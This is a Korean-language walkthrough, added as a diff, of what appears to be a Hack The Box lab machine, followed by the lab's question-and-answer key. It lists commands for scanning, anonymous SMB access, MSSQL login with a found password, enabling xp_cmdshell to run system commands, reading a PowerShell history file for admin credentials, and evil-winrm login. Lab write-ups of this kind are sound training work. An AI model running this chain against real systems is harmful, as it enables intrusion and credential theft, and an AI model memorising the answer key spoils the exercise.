@@ -1,0 +1,77 @@
+1. 포트 확인
+nmap -sV htb_ip
+
+
+2. SMB파일 확인 및 접속
+smbclient -L htb_ip -N
+smbclient htb_ip/backups -N
+get 파일이름
+
+
+3. MSSQL 접속
+impacket-mssqlclient ID:PASSWORD@htb_ip -windows-auth
+or
+python3 mssqlclient.py sql_svc:M3g4c0rp123@10.129.37.7 -windows-auth
+
+
+4. xp_cmdshell 활성화
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+xp_cmdshell "whoami"
+계정 확인
+xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+
+5. 어드민으로 로그인
+터미널에서 evil-winrm -i htb_ip -u adminID -p PASSWORD
+비밀번호에 !!가 있어 작은따음표로 감싸줌
+
+
+6. flag, root flag 찾기
+
+
+-------------------------------
+
+
+1. Which TCP port is hosting a database server?
+데이터베이스 서버는 어떤 TCP 포트에서 호스팅되고 있습니까?
+
+> 1433
+
+
+2. What is the name of the non-Administrative share available over SMB?
+SMB를 통해 이용 가능한 관리자용이 아닌 공유 폴더의 이름은 무엇입니까?
+
+> backups
+
+
+3. What is the password identified in the file on the SMB share?
+SMB 공유 폴더에 있는 파일에 명시된 암호는 무엇입니까?
+
+> M3g4c0rp123
+
+
+4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
+Impacket 컬렉션의 어떤 스크립트를 사용하여 Microsoft SQL Server에 인증된 연결을 설정할 수 있습니까?
+
+> mssqlclient.py
+
+
+5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
+Microsoft SQL Server의 확장 저장 프로시저 중 Windows 명령 셸을 실행하는 데 사용할 수 있는 것은 무엇입니까?
+
+> xp_cmdshell
+
+
+6. What script can be used in order to search possible paths to escalate privileges on Windows hosts?
+윈도우 호스트에서 권한 상승이 가능한 경로를 검색하는 데 사용할 수 있는 스크립트는 무엇입니까?
+
+> winPEAS
+
+
+7. What file contains the administrator's password?
+관리자 비밀번호는 어떤 파일에 들어 있나요?
+
+>ConsoleHost_history.txt
